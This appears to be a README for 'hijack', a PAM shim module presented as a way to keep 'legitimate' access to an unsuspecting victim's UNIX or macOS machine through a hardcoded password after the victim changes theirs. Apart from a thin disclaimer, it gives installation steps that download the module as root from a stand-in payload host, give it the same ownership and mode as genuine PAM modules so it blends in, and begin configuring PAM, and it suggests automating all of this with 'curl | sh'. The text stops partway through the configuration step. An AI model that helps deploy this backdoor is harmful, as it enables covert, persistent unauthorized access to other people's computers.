# hijack
A PAM module created to act as a shim enabling sustained "legitimate" access to an unsuspecting victim's UNIX-based computer, even in the event of a password change.

**DISCLAIMER**
 - This small utility is provided for educational use on machines you yourself own or whose owner has given you their full consent. You are solely responsible for any, uh... trouble in which you might (and probably will) find yourself after using hijack under other conditions.
 - Hijack is not exactly designed with security in mind. Of course, you are free to use it as a foothold to get back into your box in the event of a password mishap (or some similar event), but this is *not* recommended by any means. As of the current version, the "secret" password hijack checks against is simply a string literal stored in plaintext within the hijack binary. Anyone who greps through the binary can see it – you can try this yourself if you'd like: just run `strings /usr/lib/pam/hijack.so` and you should see your password in the output. Bad design, I know. I'm just too lazy to fix it.

## Features (& Relevant Caveats)
This code has only been tested on Mac OS X (versions 10.7 - 10.10), but it should theoretically function on any UNIX system that employs PAM authentication.

IMPORTANT: Hijack does *not* affect LoginWindow.app (the Mac OS X login screen), as it refuses to go through PAM for some reason. Hijack **does** however work fine in conjunction with setuid-based privilege management systems like su/sudo and over traditional UNIX remote access services such as SSH/telnet/rlogin, etc. Ironically, the Mac OS X screensaver password lock also seems to work without a hitch.

## Building
Building hijack is not very difficult. It've gotten it to build flawlessly with both clang and tcc on my MacBook; YMMV with other setups. There's no configure script or anything, just a Makefile. The code itself is stupidly simple, as it's just a shim. Modify the Makefile as needed if your toolchain complains about something, it's only around 15 lines long.

For those of you who aren't familiar with the unix build system: just pop open a shell window, cd to the source directory, and type `make`. Mac OS X users will need to have installed Apple's Xcode command line tools package for this to work correctly – if you haven't already done so just execute `xcode-select --install` in your shell and click "Install" (*not* "Get Xcode", unless of course you *want* to have Xcode).

## Installing
Installing is also a walk in the park, but it does require you to spend a minute or so on the admin account of the machine in question. It'll work over SSH (or any other remote PTY) as well of course, so physical access is not necessarily a prerequisite in every case. The process itself remains more or less identical across different machines running the same OS, and can easily be automated with a shell script – which in turn speeds installation even further, especially when paired with a `curl | sh`-style pipe command. Such a script is intentionally not included for (hopefully) obvious reasons. If you require this or similar functionality though, rest assured that it's completely trivial to implement by oneself.

1. Move a copy of the shared library file `hijack.so` into your PAM library path. The precise location differs according to operating system – on some systems it can be ascertained by simply scrolling to the end of PAM's manual page ('man pam'), others might have you resorting to something like `locate pam_rootok` which, while perfectly functional, is a little bit messy in my opinion. On Mac OS X however, I've found that it's nearly always `/usr/lib/pam/`.
```
    $ sudo -i
    Password:
    # curl -L http://web.server.hosting.payload/payloads/hijack.so -o /usr/lib/pam/hijack.so
```
2. Change the permission attributes of `/usr/lib/pam/hijack.so` to match the other "real" PAM modules in `/usr/lib/pam`. On my MacBook, this is `root:wheel` ownership and mode 0444. In this case I downloaded the file as root, so already had the correct ownership – but I'll just `chown` it anyway for kicks.
```
    # cd /usr/lib/pam
    # chown root:wheel hijack.so
    # chmod 0444 hijack.so
```
3. Edit the relevant configuration files in ``/etc/pam.d`
